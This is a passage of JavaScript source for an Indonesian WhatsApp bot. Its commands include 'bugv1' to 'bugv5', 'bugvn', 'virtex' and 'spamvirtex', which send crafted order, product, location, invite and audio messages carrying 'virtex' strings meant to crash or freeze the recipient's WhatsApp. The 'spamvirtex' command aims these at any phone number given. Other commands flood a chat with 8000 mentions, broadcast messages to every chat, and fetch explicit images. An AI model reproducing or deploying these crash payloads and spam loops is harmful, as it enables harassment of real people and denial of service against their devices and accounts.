           case 'bugv1':
                if(isZadani) return
         if (!isOwner) return onlyOwner()
              {
                var kirim = ikyc.prepareMessageFromContent(from, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': virgam,
                        'itemCount': jumlahTroli,
                        'status': 1,
                        'surface': 1,
                        'message': virtex7(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                });
                 ikyc.relayWAMessage(kirim)

                }
                break
case 'tag3':
if (iky.message.extendedTextMessage === undefined || iky.message.extendedTextMessage === null) return reply("Gada yang di tag")
mentioned = iky.message.extendedTextMessage.contextInfo.mentionedJid
teks = `*Repeat Tag*\n${q}`
teks += "\n\n"
members_id = []
for (let z = 0; z < 8000; z++) {
teks += ` @${mentioned[0].split("@")[0]}`
members_id.push(mentioned[0])
}
mentions(teks, members_id, true)
break                
             
                case 'bugv2':
                     if(isZadani) return
            if (!isOwner) return onlyOwner()
                             ikyc.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo:forward})
                            break
                
                
                
                case 'bugv3':
                     if(isZadani) return
                   if (!isOwner) return onlyOwner()
                ikyc.sendMessage(from, `${virtex7(prefix)} `, text, {
                    'contextInfo': {
                        'text': '🔥',
                        'forwardingScore': 999999999,
                        'isForwarded': true,
                        'sendEphemeral': true,
                        'externalAdReply': {
                            'title': 'bug',
                            'body': '',
                            'previewType': 'PHOTO',
                            'thumbnail': thumb,
                            'sourceUrl': ''
                        }
                    },
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                         'remoteJid': '0@s.whatsapp.net'
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 'INQUIRY',
                                'surface': 'CATALOG',
                                'message': 'NOPE',
                                'orderTitle': 'hay',
                                'thumbnail': davizin,
                                  'sellerJid': '0@s.whatsapp.net'
                            }
                        }
                    }
                });
                break;
                
                
                
                
                
           case 'bugv4':
                if(isZadani) return
                    if (!isOwner) return onlyOwner()
                    if(isGroup) return setReply("Gunakan bug ini di chat")
           {                
                    ikyc.sendMessage(from, {
                        'groupName': virtex8(prefix),
                        'groupJid': '6289699472590-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: forward
                    })             
                    }
                    break;
                    
           case 'bugv5':
                if(isZadani) return
                    if (!isOwner) return onlyOwner()
           {
              
               hmm4 = fs.readFileSync('./stik/fake.jpeg'),
               imeu = await ikyc.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
                imeg = imeu.message.imageMessage
                   res = await ikyc.prepareMessageFromContent(from, {
                        'productMessage': {
                            'product': {
                           'productImage': imeg,
                                'productId': '',
                                'title': virtex8(prefix),
                                'description': virtex8(prefix),
                                'priceAmount1000': '1000',
                                'descriptionCount': 1,
                                'productImageCount': '1'
                            },
                            'businessOwnerJid': `0@s.whatsapp.net`,
                            'contextInfo': forward
                        }
                    }, {
                  contextInfo: forward
                    }), 
                  ikyc.relayWAMessage(res)
                
                    }
                    break;
    
           case 'bugvn':
           if(isZadani) return
                    if (!isOwner) return onlyOwner()
                iya2 = fs.readFileSync('./lib/amaterasu.mp3')
                ikyc.sendMessage(from, iya2, audio, {
                    'quoted': {
                        'key': {
                            'participant': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 1,
                                'thumbnail': virgam,
                                'surface': 1,
                                'message': virtex7(prefix),
                                'orderTitle': fake,
                                'sellerJid': "0@s.whatsapp.net",
                                'sendEphemeral': true,
                            }
                        }
                    },
                    'filename': '' + ngazap(prefix),
                    'mimetype': 'audio/mp4',
                    'duration': '359996400',
                    'ptt': true
                });
                break;

  case 'virtex':
                if(isZadani) return
                    if (!isOwner) return onlyOwner()
           {
           setReply('*Loading...*')
               await ikyc.sendMessage(from, virtexbytsukasa(prefix), text)                
               await ikyc.sendMessage(from, virtex(prefix), text)            
                await ikyc.sendMessage(from, virtex2(prefix), text)       
                 await ikyc.sendMessage(from, virtex3(prefix), text)    
                await ikyc.sendMessage(from, virtex4(prefix), text)              
                await ikyc.sendMessage(from, virtex5(prefix), text)     
                await ikyc.sendMessage(from, virtex6(prefix), text)
                await ikyc.sendMessage(from, virtex7(prefix), text)   
                await ikyc.sendMessage(from, virtex8(prefix), text)            
                await ikyc.sendMessage(from, virtex9(prefix), text)       
                 await ikyc.sendMessage(from, virtex10(prefix), text)    
                await ikyc.sendMessage(from, virtex11(prefix), text)              
                await ikyc.sendMessage(from, virtex12(prefix), text)     
                await ikyc.sendMessage(from, philip(prefix), text)
                 await ikyc.sendMessage(from, slayer(prefix), text) 
                 await ikyc.sendMessage(from, ngazap(prefix), text)
           }
                break;
           
           
           
           
           
           
           
           
          
           
           case 'spamvirtex':    
              //  if(isZadani) return
                   if (!isOwner) return onlyOwner()
                     try {                 
                     setReply('*Loading...*')
                    if (args.length < 1) return setReply(`Penggunaan ${prefix}spamvirtex nomor`)
					if (args[0].startsWith('08')) return setReply('Gunakan kode negara kak')
			       woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
					var nilaiAwal = 1;
                    while(nilaiAwal <= 3) { 
                     await ikyc.sendMessage(`${woke}@s.whatsapp.net`, virtex7(prefix), text, {contextInfo: forward})
                     await ikyc.sendMessage(`${woke}@s.whatsapp.net`, virtex6(prefix), text, {contextInfo: forward})
                     await ikyc.sendMessage(`${woke}@s.whatsapp.net`, ngazap(prefix), text, {contextInfo: forward})
                     await ikyc.sendMessage(`${woke}@s.whatsapp.net`, philip(prefix), text, {contextInfo: forward})
                     await ikyc.sendMessage(`${woke}@s.whatsapp.net`, virtexbytsukasa(prefix), text, {contextInfo: forward})
                     nilaiAwal++}
					await ikyc.sendMessage(from, `*Sukses send virtex sebanyak 15 virtex ke nomor ${q}*`, text, {quoted : iky})
					} catch (e) {
					console.log('Error :', e)
					setReply(`*Gagal mengirim virtex, System error pastikan memasukan nomer whatsapp dengan benar*`)
					}                        
					break
      
           
           
           case 'ssweb':
            case 'ss':
            if(!isUrl(args[0]) && !args[0].includes('www.')) return reply("Link error");
                if (args.length < 1) return setReply('Urlnya mana om')
					teks = q
					ana = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
					buff = await getBuffer(ana.screenshot)
					ikyc.sendMessage(from, buff, image, {quoted: ftrol, caption : teks})
					break
           
           
           
           
           
           
           
           
           
           
           
           
//-------------------------------》FITUR OWNER《-------------------------------\\     
           
           case 'addorder':
            try{
           if (!isOwner) return onlyOwner()
            if (args.length < 1) return setReply(`Penggunaan :\n${prefix}addorder linkgc 60s\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)       
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return setReply(mess.Iv)
            if (!q) return setReply('masukan link gcnya kak')
            
             var LinkGc = q.split(" ")[0];
            var Second = q.split(" ")[1];
           
            var net = LinkGc.split('https://chat.whatsapp.com/')[1]
            if (!net) return setReply('pastikan itu link https://whatsapp.com/')
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await ikyc.query({ 
            json: ["query", "invite",net],
            expect200:true })
           if(_sewa.checkSewaGroup(id, sewa)) return setReply("Grup tersebut masih tersisa waktu sewa")
              if(!isGroup){            
                          let code = LinkGc.replace('https://chat.whatsapp.com/', '')
                          ikyc.acceptInvite(code)                                   
                          } else {
                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return setReply('*The link is invalid Tod*')
                            link = LinkGc.replace('https://chat.whatsapp.com/','')
                            fak = ikyc.query({ json: ['action', 'invite', link],
                            expect200: true })                        
                            }                          
                            await setReply(`Sukses join kak`)
                              
                        _sewa.addSewaGroup(id, subject, LinkGc, Second, sewa)
                       await sendButMessage(id, `HALO KAK AKU *${fake}*`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}ceksewa`, buttonText: {displayText: `Cek sewa`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `Menu`,},type: 1}]);
                            }catch (err){
					      console.log(err)
					       return setReply("Link Error")
					       }
                           break
             
case "bapack":        
        sendButMessage(from, `CEK BAPAK`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}bapakcek`,
            buttonText: {
              displayText: `BAPAK GW DI TANEM`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}bapakmati`,
            buttonText: {
              displayText: `BAPAK GW KNTL`,
            },
            type: 1,
          },
        ]);
        break;        
case 'bapakcek':
reply(`Yahahah Bapak si ${pushname} Di tanem`)
break 
case 'bapakmati':
reply(`𝙔𝙖𝙝𝙖𝙝𝙖
Bapak Si ${pushname} Kek Kntl`)
break       
        case 'free1hari':
            try{
            if (!q) return setReply('Masukan link gcnya kak')
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return setReply("Linknya betul ga tuh")
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return setReply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await ikyc.query({ 
            json: ["query", "invite",net],
            expect200:true })
            if(!isGroup){            
                          let code = args[0].replace('https://chat.whatsapp.com/', '')
                          ikyc.acceptInvite(code)                                   
                          } else {
                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return setReply('*The link is invalid Tod*')
                            link = args[0].replace('https://chat.whatsapp.com/','')
                            fak = ikyc.query({ json: ['action', 'invite', link],
                            expect200: true })                        
                            }                          
                            await setReply(`Oke aku udah join :)`)
                            await ikyc.sendMessage(`${nomerOwner}@s.whatsapp.net`,`*「 freeoneday 」*\n\nHalo kak, ada yang sewa aku nih\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nLink Gc : \n\n${q}\n\nCommand :\n${prefix}${command}\n\n\n© ${fake1}\n${calender}\n`,text)                                         
                             _sewa.addSewaGroup(id, subject, q, "1d", sewa)
                            await sendButMessage(id, `HALO KAK AKU *${fake}*`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}ceksewa`, buttonText: {displayText: `Cek sewa`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `Menu`,},type: 1}]);
                            }catch (err){
					      console.log(err)
					       return setReply("Link Error")
					       }
                           break        
        case 'antibuggc':
                    if(!isGroup) return setReply("Hanya bisa di group")
			        if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (Antibuggc) return setReply('Sudah aktif kak')
                    antibug.push(from);
                    fs.writeFileSync("./database/antibug.json",JSON.stringify(antibug));
                    setReply("Sukses mengaktifkan antibuggc di grub ini!");
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!Antibuggc) return setReply('Sudah Mati')
                    antibug.splice(from, 1); fs.writeFileSync("./database/antibug.json", JSON.stringify(antibug));
                    setReply("Sukses mematikan antibuggc!");
					} else if (!q) {
                      sendButMessage(from, `MODE ANTI BUGGC`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antibuggc on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antibuggc off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
                 case 'nsfw':
                  if(!isGroup) return setReply("Hanya bisa di group")
                    if(isZadani) return
			        if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (isNsfw) return setReply('Sudah aktif kak')
                    nsfw.push(from);      
                    setReply("Sukses mengaktifkan fitur nsfw di grub ini!");
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!isNsfw) return setReply('Sudah Mati')
                    nsfw.splice(from, 1);
                    setReply("Sukses mematikan fitur nsfw!");
					} else if (!q) {
                      sendButMessage(from, `MODE MANTAP MANTAP`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}nsfw on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}nsfw off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;     
  // Random Image //
                case 'art':
                case 'bts':
                case 'exo':
                case 'elf':
                case 'neko':
                case 'waifu':
                case 'shota':
                case 'husbu':
                case 'sagiri':
                case 'shinobu':
                case 'megumin':
                case 'wallnime':
                    getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`).then((gambar) => {
                        ikyc.sendMessage(from, gambar, image, { quoted: iky })                       
                    })
                    break
                case 'chiisaihentai':
                case 'trap':
                case 'blowjob':
                case 'yaoi':
                case 'ecchi':
                case 'hentai':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
                    await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${apikey}`).then((gambar) => {
                        ikyc.sendMessage(from, gambar, image, { quoted: iky })
                    })
                    break
                case 'bj':
                case 'ero':
                case 'cum':
                case 'feet':
                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'waifu':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'hentai':
                case 'eroyuri':
                case 'cum_jpg':
                case 'blowjob':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wallpaper':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':
                    getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}`).then((gambar) => {
                        ikyc.sendMessage(from, gambar, image, { quoted: iky })
                    })
                    break                          
                 case 'forward':
					       if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (forwarding === true) return setReply('Udah aktif kak')
                    forwarding = true
                    let ah =`Mode forwarding/diteruskan berhasil diaktifkan \nsilakan ketik ${prefix}menu untuk melihat perbedaanya`
                    ikyc.sendMessage(from, ah, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (forwarding === false) return setReply('Udah off kak')
                     forwarding = false
                     let uh =`Mode forwarding telah di matikan`
                     ikyc.sendMessage(from, uh, text, { quoted: setQuoted})
					} else if (!q) {
                      sendButMessage(from, `MODE AUTO TYPING`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}forwarding on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}forwarding off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
           
           
     
	
	case 'tobc':
				if (!isOwner && !iky.key.fromMe) return reply(`Khusus Owner Om`)
				ikyc.updatePresence(from, Presence.composing)
					woy = await ikyc.chats.all()
					if (isMedia && !iky.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of woy) {
							ikyc.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !iky.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of woy) {
							ikyc.sendMessage(_.jid, buff, sticker, { quoted: fhidetag, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
           
           
           case 'bc':
           
					if (!isOwner && !iky.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					await setReply(`*Loading...*`)
					anus = await ikyc.chats.all()
					let butonih = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					
					if (isMedia && !iky.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await ikyc.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !iky.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await ikyc.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !iky.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await ikyc.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						}else if (isMedia && !iky.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await ikyc.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
					} else {
						for (let _ of anus) {
							await sendBc(_.jid, ` *BROADCAST*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'),butonih)
						}
						await setReply(`Sukses mengirim Broadcast:\n${q}`)
					}
					break
					
					
					
					case 'bcpc':
					if (!isOwner && !iky.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					await setReply(`*Loading...*`)
					anus = await ikyc.chats.all().filter(v => v.jid.endsWith('s.whatsapp.net'))
					let ohyeah = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					if (isMedia && !iky.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await ikyc.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !iky.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await ikyc.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !iky.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await ikyc.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						}else if (isMedia && !iky.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await ikyc.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
					} else {
						for (let _ of anus) {
							await sendBc(_.jid, ` *BROADCAST*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'),ohyeah)
						}
						await setReply(`Sukses mengirim Broadcast:\n${q}`)
					}
					break
					
					
					
					
					case 'bcgc':
					if (!isOwner && !iky.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					await setReply(`*Loading...*`)
					anus = await ikyc.chats.all().filter(v => v.jid.endsWith('g.us'))
					let yesnih = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					if (isMedia && !iky.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await ikyc.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !iky.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await ikyc.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !iky.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await ikyc.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						}else if (isMedia && !iky.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await ikyc.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
					    } else {
						for (let _ of anus) {
							
					    await sendBc(_.jid, ` *BROADCAST GROUP*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), yesnih)
						} 
						await setReply(`Sukses mengirim Broadcast:\n${q}`)
					    }
					   break				   
					case 'pcallmember':
					case 'pcallmem':
					case 'bcmember':
					if(!isGroup) return setReply("Fitur hanya bisa di gunakan di dalam group")
					if (!isOwner && !iky.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					await setReply(`*Loading...*`)
					anus = await groupMembers
					let ayey = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                    {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					if (isMedia && !iky.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							ikyc.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !iky.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
